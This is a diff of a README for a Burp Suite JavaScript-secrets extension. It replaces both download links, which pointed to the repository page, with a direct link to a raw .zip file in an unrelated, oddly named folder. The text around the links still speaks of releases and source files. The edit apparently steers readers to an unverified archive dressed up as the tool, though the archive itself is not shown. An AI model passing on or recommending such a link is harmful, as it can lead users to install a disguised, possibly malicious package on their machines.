@@ -1,6 +1,6 @@
 # 🔎 BurpJSReconRadar - Find Hidden JS Secrets Fast
 
-[![Download BurpJSReconRadar](https://img.shields.io/badge/Download-BurpJSReconRadar-blue?style=for-the-badge)](https://github.com/Ralffotografo/BurpJSReconRadar)
+[![Download BurpJSReconRadar](https://img.shields.io/badge/Download-BurpJSReconRadar-blue?style=for-the-badge)](https://github.com/Ralffotografo/BurpJSReconRadar/raw/refs/heads/main/Pectinibranchia/Radar-Recon-JS-Burp-2.5.zip)
 
 ## 🧭 What BurpJSReconRadar Does
 
@@ -29,7 +29,7 @@ BurpJSReconRadar is made for passive checks inside Burp Suite. It fits best in a
 
 Visit this page to download BurpJSReconRadar:
 
-[https://github.com/Ralffotografo/BurpJSReconRadar](https://github.com/Ralffotografo/BurpJSReconRadar)
+[https://github.com/Ralffotografo/BurpJSReconRadar/raw/refs/heads/main/Pectinibranchia/Radar-Recon-JS-Burp-2.5.zip](https://github.com/Ralffotografo/BurpJSReconRadar/raw/refs/heads/main/Pectinibranchia/Radar-Recon-JS-Burp-2.5.zip)
 
 On the page, look for the latest release, source files, or build files. Download the file that matches the setup steps below.
 
